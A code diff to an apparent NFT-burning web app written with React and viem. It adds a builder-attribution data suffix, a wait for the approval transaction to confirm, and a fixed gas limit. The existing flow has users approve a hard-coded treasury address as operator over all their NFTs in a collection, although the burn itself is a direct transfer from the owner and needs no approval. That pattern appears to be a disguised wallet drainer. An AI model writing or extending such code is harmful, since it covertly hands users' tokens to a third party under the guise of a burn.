@@ -13,11 +13,12 @@ import {
   Shield,
   X,
 } from "lucide-react";
-import { createWalletClient, custom } from "viem";
+import { createWalletClient, custom, waitForTransactionReceipt } from "viem";
 
 // ─── Constants ───────────────────────────────────────────────────────────────
 const TREASURY = "0x64D868100191D920D8d52F05F91462Bc702ba0ba";
 const ALCHEMY_KEY = import.meta.env.VITE_ALCHEMY_KEY as string;
+const DATA_SUFFIX = ""; // For Base builder attribution, append hex-encoded suffix here, e.g., "0x0000000000000000000000000000000000000000000000000000000000000000" + builderAddress.slice(2)
 
 // ─── Multi-chain config ───────────────────────────────────────────────────────
 type ChainType = "evm";
@@ -263,34 +264,25 @@ export default function App() {
         const approvalData = "0x" + setApprovalSelector + 
           TREASURY.slice(2).padStart(64, "0") + "1".padStart(64, "0");
         
-        await walletClient.sendTransaction({
+        const approvalHash = await walletClient.sendTransaction({
           to: nft.contract as `0x${string}`,
           data: approvalData,
         });
+        await waitForTransactionReceipt(walletClient, { hash: approvalHash });
       }
 
       // Encode burn transfer
       const BURN_ADDRESS = "0x000000000000000000000000000000000000dEaD";
-      const burnData = encodeERC721Transfer(walletAddress!, BURN_ADDRESS, tokenId);
+      let burnData = encodeERC721Transfer(walletAddress!, BURN_ADDRESS, tokenId);
       
-      // Estimate gas with 30% buffer and minimum 150k
-      const gasEstimate = await (window as any).ethereum?.request({
-        method: "eth_estimateGas",
-        params: [{
-          from: walletAddress,
-          to: nft.contract as `0x${string}`,
-          data: burnData,
-        }],
-      });
-      
-      const gasWithBuffer = Math.ceil(parseInt(gasEstimate, 16) * 1.3);
-      const gasLimit = "0x" + Math.max(150000, gasWithBuffer).toString(16);
+      // Append dataSuffix for builder attribution
+      burnData = burnData + DATA_SUFFIX.slice(2);
 
-      // Send burn transaction
+      // Send burn transaction with fixed gas limit
       const txHash = await walletClient.sendTransaction({
         to: nft.contract as `0x${string}`,
         data: burnData,
-        gas: BigInt(gasLimit),
+        gas: BigInt(150000),
       });
 
       setActions((prev) => ({
